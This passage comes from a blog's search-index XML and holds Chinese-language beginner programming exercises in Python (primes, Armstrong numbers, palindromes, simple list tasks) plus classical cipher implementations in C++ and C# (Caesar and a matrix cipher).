keyword">if</span> n<span class="token operator">==</span>prime:    print<span class="token punctuation">(</span>n<span class="token punctuation">)</span>else:    <span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">>=</span>prime<span class="token punctuation">)</span>:        k<span class="token operator">=</span>n%prime        if<span class="token punctuation">(</span> k <span class="token operator">==</span> 0<span class="token punctuation">)</span>:            print<span class="token punctuation">(</span>prime<span class="token punctuation">)</span>            n<span class="token operator">=</span>n/prime        else:            prime<span class="token operator">=</span>prime+1</code></pre><h2 id="153是一个非常特殊的数，它等于它的每位数字的立方和，即153-111-555-333。编程求所有满足这种条件的三位十进制数。"><a href="#153是一个非常特殊的数，它等于它的每位数字的立方和，即153-111-555-333。编程求所有满足这种条件的三位十进制数。" class="headerlink" title="153是一个非常特殊的数，它等于它的每位数字的立方和，即153=111+555+333。编程求所有满足这种条件的三位十进制数。"></a>153是一个非常特殊的数，它等于它的每位数字的立方和，即153=111+555+333。编程求所有满足这种条件的三位十进制数。</h2><pre class=" language-bash"><code class="language-bash">def isSpecialNum<span class="token punctuation">(</span>n<span class="token punctuation">)</span>:    <span class="token function">sum</span> <span class="token operator">=</span> 0    a<span class="token operator">=</span>n//100    b<span class="token operator">=</span>n%100//10    c<span class="token operator">=</span>n%10    <span class="token function">sum</span> <span class="token operator">=</span> <span class="token function">sum</span> + a*a*a + b*b*b+c*c*c    <span class="token keyword">if</span> <span class="token function">sum</span> <span class="token operator">==</span> n:        <span class="token keyword">return</span> True    else:        <span class="token keyword">return</span> False<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>100,1000<span class="token punctuation">)</span>:    <span class="token keyword">if</span> isSpecialNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><h2 id="123321是一个非常特殊的数，它从左边读和从右边读是一样的。输入一个正整数n，-编程求所有这样的五位和六位十进制数，满足各位数字之和等于n-。"><a href="#123321是一个非常特殊的数，它从左边读和从右边读是一样的。输入一个正整数n，-编程求所有这样的五位和六位十进制数，满足各位数字之和等于n-。" class="headerlink" title="123321是一个非常特殊的数，它从左边读和从右边读是一样的。输入一个正整数n， 编程求所有这样的五位和六位十进制数，满足各位数字之和等于n 。"></a>123321是一个非常特殊的数，它从左边读和从右边读是一样的。输入一个正整数n， 编程求所有这样的五位和六位十进制数，满足各位数字之和等于n 。</h2><pre class=" language-bash"><code class="language-bash">def isHuiWenNum<span class="token punctuation">(</span>n<span class="token punctuation">)</span>:    result<span class="token operator">=</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span>::-1<span class="token punctuation">]</span>    <span class="token keyword">if</span> result<span class="token operator">==</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span>:        <span class="token keyword">return</span> True    else:        <span class="token keyword">return</span> Falsedef isEqual<span class="token punctuation">(</span>n,check<span class="token punctuation">)</span>:    sum<span class="token operator">=</span>0    b<span class="token operator">=</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    int<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    duan<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>b<span class="token punctuation">))</span>:        duan.append<span class="token punctuation">(</span>n%10<span class="token punctuation">)</span>        n//<span class="token operator">=</span>10        sum+<span class="token operator">=</span>duan<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token function">sum</span> <span class="token operator">==</span> check:        <span class="token keyword">return</span> True    else:        <span class="token keyword">return</span> Falseduan <span class="token operator">=</span> eval<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>10000,1000000<span class="token punctuation">)</span>:    <span class="token keyword">if</span> isHuiWenNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span>:        <span class="token keyword">if</span> isEqual<span class="token punctuation">(</span>i,duan<span class="token punctuation">)</span>:            print<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    else:        <span class="token keyword">continue</span></code></pre><h2 id="给出一个包含n个整数的数列，问整数a在数列中的第一次出现是第几个。"><a href="#给出一个包含n个整数的数列，问整数a在数列中的第一次出现是第几个。" class="headerlink" title="给出一个包含n个整数的数列，问整数a在数列中的第一次出现是第几个。"></a>给出一个包含n个整数的数列，问整数a在数列中的第一次出现是第几个。</h2><pre class=" language-bash"><code class="language-bash">n <span class="token operator">=</span> eval<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">))</span>duan <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>item <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token punctuation">)</span>.split<span class="token punctuation">(</span><span class="token punctuation">)</span>ch <span class="token operator">=</span> eval<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">))</span>duan <span class="token operator">=</span> <span class="token punctuation">[</span>eval<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> item<span class="token punctuation">]</span>index<span class="token operator">=</span>-1<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>duan<span class="token punctuation">))</span>:    <span class="token keyword">if</span> ch <span class="token operator">==</span> duan<span class="token punctuation">[</span>i<span class="token punctuation">]</span>:        index <span class="token operator">=</span> i        <span class="token keyword">break</span><span class="token keyword">if</span> index <span class="token operator">!=</span> -1:    print<span class="token punctuation">(</span>index+1<span class="token punctuation">)</span>else:    print<span class="token punctuation">(</span>-1<span class="token punctuation">)</span></code></pre><h2 id="给出n个数，找出这n个数的最大值，最小值，和。"><a href="#给出n个数，找出这n个数的最大值，最小值，和。" class="headerlink" title="给出n个数，找出这n个数的最大值，最小值，和。"></a>给出n个数，找出这n个数的最大值，最小值，和。</h2><pre class=" language-bash"><code class="language-bash">n <span class="token operator">=</span> eval<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">))</span>duan <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>item <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token punctuation">)</span>.split<span class="token punctuation">(</span><span class="token punctuation">)</span>duan <span class="token operator">=</span> <span class="token punctuation">[</span>eval<span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token keyword">for</span> num <span class="token keyword">in</span> item<span class="token punctuation">]</span>print<span class="token punctuation">(</span>max<span class="token punctuation">(</span>duan<span class="token punctuation">))</span>print<span class="token punctuation">(</span>min<span class="token punctuation">(</span>duan<span class="token punctuation">))</span>print<span class="token punctuation">(</span>sum<span class="token punctuation">(</span>duan<span class="token punctuation">))</span></code></pre><a id="more"></a><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cipher.md</title>
      <link href="/2020/03/05/cipher-md/"/>
      <url>/2020/03/05/cipher-md/</url>
      
        <content type="html"><![CDATA[<h3 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h3><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include &lt;iostream></span>using namespace std<span class="token punctuation">;</span>char upper_E3<span class="token punctuation">(</span>char str,int shift<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> char<span class="token punctuation">((</span>str-65+shift<span class="token punctuation">)</span>%26+65<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>char lower_E3<span class="token punctuation">(</span>char str,int shift<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> char<span class="token punctuation">((</span>str-97+shift<span class="token punctuation">)</span>%26+97<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>int main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    string str <span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>//明文    string str1<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>//密文    int <span class="token function">shift</span> <span class="token operator">=</span> 3<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"输入明文："</span><span class="token punctuation">;</span>    getline<span class="token punctuation">(</span>cin,str<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"输入移位量："</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> <span class="token function">shift</span><span class="token punctuation">;</span>    for<span class="token punctuation">(</span>int i <span class="token operator">=</span>0<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>str.length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i++<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        if<span class="token punctuation">(</span>isalpha<span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">))</span>        <span class="token punctuation">{</span>            if<span class="token punctuation">(</span>islower<span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">))</span>                str1 +<span class="token operator">=</span> lower_E3<span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span>,shift<span class="token punctuation">)</span><span class="token punctuation">;</span>            if<span class="token punctuation">(</span>isupper<span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">))</span>                str1 +<span class="token operator">=</span> upper_E3<span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span>,shift<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            str1 +<span class="token operator">=</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"密文："</span> <span class="token operator">&lt;&lt;</span>str1 <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>###<br>明文：PLEASESENDMETHEBOOKMYCREDITCARDNOISSIXONETWOONETHREEEIGHTSIXZEROONESIXEIGHTFOURNINESEVENZEROTWO<br><img src="http://q6py5t1v8.bkt.clouddn.com/%E5%AF%86%E7%A0%81%E5%AD%A6.png" alt="alt"></p><pre class=" language-bash"><code class="language-bash">using System<span class="token punctuation">;</span>using System.Collections.Generic<span class="token punctuation">;</span>using System.Linq<span class="token punctuation">;</span>using System.Text<span class="token punctuation">;</span>using System.Threading.Tasks<span class="token punctuation">;</span>namespace 第三题<span class="token punctuation">{</span>    class Program    <span class="token punctuation">{</span>        static void Main<span class="token punctuation">(</span>string<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            int<span class="token punctuation">[</span>,<span class="token punctuation">]</span> A <span class="token operator">=</span> new int<span class="token punctuation">[</span>4, 4<span class="token punctuation">]</span>             <span class="token punctuation">{</span>               <span class="token punctuation">{</span> 3, 13, 21, 9 <span class="token punctuation">}</span>,               <span class="token punctuation">{</span> 15, 10, 6, 25 <span class="token punctuation">}</span>,               <span class="token punctuation">{</span> 10, 17, 4, 8 <span class="token punctuation">}</span>,              <span class="token punctuation">{</span> 1, 23, 7, 2 <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">;</span>            int<span class="token punctuation">[</span><span class="token punctuation">]</span> B <span class="token operator">=</span> new int<span class="token punctuation">[</span>4<span class="token punctuation">]</span> <span class="token punctuation">{</span> 1,21,8,17<span class="token punctuation">}</span><span class="token punctuation">;</span>            string cipher <span class="token operator">=</span> <span class="token string">"PLEASESENDMETHEBOOKMYCREDITCARDNOISSIXONETWOONETHREEEIGHTSIXZEROONESIXEIGHTFOURNINESEVENZEROTWO"</span><span class="token punctuation">;</span>            int<span class="token punctuation">[</span><span class="token punctuation">]</span> M <span class="token operator">=</span> new int<span class="token punctuation">[</span>cipher.Length+1<span class="token punctuation">]</span><span class="token punctuation">;</span>            int<span class="token punctuation">[</span>,<span class="token punctuation">]</span> result <span class="token operator">=</span> new int<span class="token punctuation">[</span>4,cipher.Length<span class="token punctuation">]</span><span class="token punctuation">;</span>            //            int i <span class="token operator">=</span> 0<span class="token punctuation">;</span>            foreach <span class="token punctuation">(</span>var item <span class="token keyword">in</span> cipher<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                M<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> item - <span class="token string">'A'</span><span class="token punctuation">;</span>                i++<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> 0<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cipher.Length<span class="token punctuation">;</span> i++<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>int j <span class="token operator">=</span> 0<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> 4<span class="token punctuation">;</span> j++<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    result<span class="token punctuation">[</span>i % 4, i / 4<span class="token punctuation">]</span> +<span class="token operator">=</span> M<span class="token punctuation">[</span><span class="token punctuation">(</span>i / 4<span class="token punctuation">)</span> * 4 + j<span class="token punctuation">]</span> * A<span class="token punctuation">[</span>i % 4, j<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">;</span>                <span class="token punctuation">}</span>                result<span class="token punctuation">[</span>i % 4, i / 4<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>result<span class="token punctuation">[</span>i % 4, i / 4<span class="token punctuation">]</span>+ B<span class="token punctuation">[</span>i%4<span class="token punctuation">]</span><span class="token punctuation">)</span>%26<span class="token punctuation">;</span>                Console.Write<span class="token punctuation">((</span>char<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'A'</span>+ result<span class="token punctuation">[</span>i % 4, i / 4<span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            Console.ReadLine<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
